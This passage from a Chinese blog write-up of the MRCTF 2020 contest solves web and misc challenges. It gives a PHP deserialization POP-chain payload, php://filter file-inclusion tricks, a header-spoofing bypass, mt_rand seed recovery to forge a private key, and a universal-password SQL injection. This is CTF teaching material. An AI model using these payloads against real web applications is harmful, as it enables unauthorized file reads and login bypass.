class="params">($key)</span></span>&#123; <span class="comment">//获取Test类的成员变量</span></span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function(); <span class="comment">//将变量P以函数执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>思路：反序列化时调用<code>__wakeup()</code>进行字符串比较，如果<code>$this-&gt;source</code>是<code>Show</code>类，则调用<code>__toString()</code>。</p>
<p><code>return $this-&gt;str-&gt;source;</code>会访问<code>str</code>的<code>source</code>属性，若<code>str</code>是<code>Test</code>类则不存在<code>source</code>属性，便调用了<code>__get()</code>。</p>
<p><code>__get</code>将<code>p</code>以函数执行，可以将<code>p</code>实例化为<code>Modify</code>类，就调用了<code>Modifier</code>的<code>__invoke()</code>方法。</p>
<p>最后通过<code>var</code>来构造伪协议来读源码。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">"php://filter/convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Show(<span class="string">'abc'</span>);<span class="comment">//初始化一个Show类</span></span><br><span class="line">$a-&gt;str=<span class="keyword">new</span> Test();<span class="comment">//将str实例化为Test类，访问Test类source变量时调用__get()</span></span><br><span class="line">$b=<span class="keyword">new</span> Show($a);<span class="comment">//令$this-&gt;source等于Show类，类$a被当成字符串的形式执行，从而调用__toString()</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure></div>

<p>base64解码后得到flag</p>
<a href="/2020/03/30/MRCTF/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/30/MRCTF/7.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><p>简单Bypass、伪协议、jsfuck</p>
<p>F12发现以下源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are going to the next ~"</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure></div>

<p>第一个验证把<code>_</code>和<code>%5f</code> ban了，可以用<code>空格</code>和 <code>.</code>来代替，第二个可以用换行污染<code>%0a</code>来绕过。得到提示：<code>FLAG is in secrettw.php</code>。</p>
<p>打开<code>secrettw.php</code>得到<code>But how to get it?Local access only!</code></p>
<p>源码中有jsfuck，解码得到：<code>post me Merak</code></p>
<p>post一个Merak参数，构造<code>Client-ip:127.0.0.1</code>，得到php代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123;  </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">    <span class="keyword">die</span>();  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123;  </span><br><span class="line">    $v = base64_decode($v);  </span><br><span class="line">    $re = <span class="string">''</span>;  </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;  </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> );  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> $re;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>; </span><br><span class="line">$ip = getIp(); </span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>) </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip; </span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]); </span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>要求传入<code>2333</code>变量文件的内容为<code>todat is a happy day</code></p>
<p>可以用<code>php://input</code>或者<code>data://</code>伪协议绕过，<code>data://text/plain,todat is a happy day</code>。</p>
<p>且传入的<code>file</code>变量要经过<code>change</code>加密，所以传入一个加密的伪协议或者文件名进行文件包含。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rechange</span><span class="params">($v)</span></span>&#123;</span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    $rc=base64_encode($re);</span><br><span class="line">    <span class="keyword">return</span> $rc;</span><br><span class="line">&#125;</span><br><span class="line">$v=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;<span class="comment">//得到结果进行base64解码得到flag</span></span><br><span class="line"><span class="comment">//或者$v="flag.php";然后查看源码得到flag</span></span><br><span class="line">$a=rechange($v);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></div>

<a href="/2020/03/30/MRCTF/8.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/8.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p>源码泄露、伪随机数、基础SQL</p>
<a href="/2020/03/30/MRCTF/9.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/9.png" src="/img/loading.gif" class="lazyload"></a>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure></div>

<p>要求<code>$Private_key</code>，已知<code>$Public_key = KVQP0LdJKRaV3n9D</code>，并且它们都是<code>mt_rand()</code>生成的，所以用公钥去还原种子，用种子求出私钥即可。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;<span class="comment">//字母表</span></span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">"KVQP0LdJKRaV3n9D"</span>; <span class="comment">//公钥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str2) ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str1) ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( str2[i] == str1[j] ) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d %d 0 %d "</span>, j, j, <span class="built_in">strlen</span>(str1)<span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>或者</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678'</span></span><br><span class="line">str2 = <span class="string">'KVQP0LdJKRaV3n9D'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + <span class="string">' '</span> + str(j) + <span class="string">' '</span> + <span class="string">'0'</span> + <span class="string">' '</span> + str(len(str1) - <span class="number">1</span>) + <span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></div>

<p>得到：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure></div>

<p>把上面的一串数字丢进<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_rand</a>爆破一下，得到种子：<code>1775196155</code>（注意php版本，5和7同样种子，生成不同</p>
<a href="/2020/03/30/MRCTF/10.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/10.png" src="/img/loading.gif" class="lazyload"></a>

<a href="/2020/03/30/MRCTF/11.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/11.png" src="/img/loading.gif" class="lazyload"></a>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">// genarate public_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br><span class="line"><span class="keyword">echo</span> $Public_key = public_key();</span><br><span class="line"><span class="keyword">echo</span> $a = private_key();</span><br></pre></td></tr></table></figure></div>

<p>得到私钥：XuNhoueCDCGc</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<p>用户名无所谓，password没过滤，万能密码，私钥输进去</p>
<a href="/2020/03/30/MRCTF/12.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/12.png" src="/img/loading.gif" class="lazyload"></a>

<p>登录得到flag</p>
<h3 id="Ezpop-Revenge"><a href="#Ezpop-Revenge" class="headerlink" title="Ezpop_Revenge"></a>Ezpop_Revenge</h3><p>一个复杂的反序列化，待补充</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Cyberpunk"><a href="#Cyberpunk" class="headerlink" title="Cyberpunk"></a>Cyberpunk</h3><p>当时还以为要逆向…..跑程序之前，改一下电脑日期就可</p>
<a href="/2020/03/30/MRCTF/13.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/13.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h3><p>改一下png高度</p>
<a href="/2020/03/30/MRCTF/14.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/30/MRCTF/14.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="你能看懂音符吗"><a href="#你能看懂音符吗" class="headerlink" title="你能看懂音符吗"></a>你能看懂音符吗</h3><p>改文件头、隐藏文字、音符解码</p>
<a href="/2020/03/30/MRCTF/15.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/15.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="寻找xxx"><a href="#寻找xxx" class="headerlink" title="寻找xxx"></a>寻找xxx</h3><p><a href="https://www.btis.site/2020/03/09/xctf-misc-wp/#%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF">电话音</a>+微信公众号（想抢1血的没猜到公众号……</p>
<a href="/2020/03/30/MRCTF/16.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/16.jpg" src="/img/loading.gif" class="lazyload"></a>

<h3 id="摇滚DJ"><a href="#摇滚DJ" class="headerlink" title="摇滚DJ"></a>摇滚DJ</h3><p>无线电转图片（<a href="https://apktrending.com/apk-android/xdsopl-robot36.html" target="_blank" rel="noopener">Robot36 - SSTV Image Decoder</a></p>
<a href="/2020/03/30/MRCTF/17.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/17.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="千层套路"><a href="#千层套路" class="headerlink" title="千层套路"></a>千层套路</h3><p>脚本开压缩包、RGB转二维码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ -e *.zip ]; <span class="keyword">do</span></span><br><span class="line">  files=*.zip;</span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$files</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">"Cracking <span class="variable">$&#123;file&#125;</span>… "</span>;</span><br><span class="line">    password=<span class="variable">$&#123;file%%.*&#125;</span></span><br><span class="line">    <span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"Failed to find password"</span>;</span><br><span class="line">      <span class="built_in">break</span> 2;</span><br><span class="line">    <span class="keyword">fi</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Found password: \`<span class="variable">$&#123;password&#125;</span>\`"</span>;</span><br><span class="line">    unzip -q -P <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> <span class="string">"<span class="variable">$file</span>"</span>;</span><br><span class="line">    rm <span class="string">"<span class="variable">$&#123;file&#125;</span>"</span>;</span><br><span class="line">  <span class="keyword">done</span>;</span><br><span class="line"><span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">200</span>    <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">200</span>    <span class="comment">#y坐标  x * y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>, (x, y))   <span class="comment">#创建图片</span></span><br><span class="line">file = open(<span class="string">'qr.txt'</span>)    <span class="comment">#打开rgb值的文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过每个rgb点生成图片</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, y):</span><br><span class="line">        line = file.readline()  <span class="comment">#获取一行的rgb值</span></span><br><span class="line">        rgb = line.split(<span class="string">", "</span>)  <span class="comment">#分离rgb，文本中逗号后面有空格</span></span><br><span class="line">        im.putpixel((i, j), (int(rgb[<span class="number">0</span>]), int(rgb[<span class="number">1</span>]), int(rgb[<span class="number">2</span>])))    <span class="comment">#将rgb转化为像素</span></span><br><span class="line"></span><br><span class="line">im.show()   <span class="comment">#也可用im.save('flag.jpg')保存下来</span></span><br></pre></td></tr></table></figure></div>

<h3 id="不眠之夜"><a href="#不眠之夜" class="headerlink" title="不眠之夜"></a>不眠之夜</h3><p>montage+gaps（或者手拼</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">montage *jpg -tile 10x12 -geometry 200x100+0+0 out.jpg</span><br><span class="line">gaps --image=out.jpg --generations=40 --population=120 --size=100</span><br></pre></td></tr></table></figure></div>

<p>先合并后用<a href="https://blog.csdn.net/uwr44uouqcnsuqb60zk2/article/details/78516605" target="_blank" rel="noopener">gaps</a>拼图</p>
<a href="/2020/03/30/MRCTF/18.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/18.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="pyFlag"><a href="#pyFlag" class="headerlink" title="pyFlag"></a>pyFlag</h3><p>三个照片里多余信息拼成一个新的zip、爆破zip密码 1234、base85 16 32 16 64</p>
<a href="/2020/03/30/MRCTF/21.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/21.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Unravel"><a href="#Unravel" class="headerlink" title="Unravel"></a>Unravel</h3><p>foremost、aes、silenteye</p>
<a href="/2020/03/30/MRCTF/19.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/19.png" src="/img/loading.gif" class="lazyload"></a>

<a href="/2020/03/30/MRCTF/20.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/20.png" src="/img/loading.gif" class="lazyload"></a>

